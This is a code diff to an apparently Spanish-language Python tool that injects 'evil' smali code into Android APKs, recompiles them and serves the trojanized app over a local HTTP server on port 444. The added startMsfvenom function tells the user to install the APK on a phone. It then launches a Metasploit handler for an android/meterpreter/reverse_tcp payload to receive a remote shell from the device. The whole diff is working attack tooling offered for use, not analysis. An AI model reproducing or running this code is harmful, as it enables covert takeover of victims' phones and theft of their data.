@@ -435,11 +435,20 @@ def pythonServer(fileNewApkCompiled):
     os.chdir(ruta_troyanized)
 
     try:
-        subprocess.run(['/usr/bin/xterm', '-e', f'echo "{printMessage}"; python3 -m http.server 444; bash'])
+        subprocess.Popen(['xterm', '-e', f'echo "{printMessage}"; python3 -m http.server 444; bash'])
+
     except Exception as e:
         print(f"Error al intentar abrir el terminal o ejecutar el servidor: {e}")
 
+def startMsfvenom():
+    print(f"\nInstala el APK en el móvil.")
+    print(f"Una vez instalado ingresa la IP y el puerto.\n")
 
+    localIP = input("Introduce tu IP local: ")
+    lport = input("Introduce un puerto local: ")
+    
+    msfvenom_script = f"msfconsole -q -x 'use exploit/multi/handler;set payload android/meterpreter/reverse_tcp;set lhost {localIP};set lport {lport}; exploit'"
+    subprocess.run(['xterm', '-e', 'bash', '-c', msfvenom_script])
 
 def verificar_programa_windows(programa):
     result_verificar_programas_windowsx = subprocess.run(["where", programa])
@@ -519,6 +528,8 @@ def main():
             copyEvilSmali(ruta_apks, ruta_trojan_apk)
 
             compileModifyApk(ruta_apks)
+     
+            startMsfvenom()
 
         elif sistema == "nt":
             repoUrl = "https://github.com/APKentiTEAM/InfectedAPK.git"
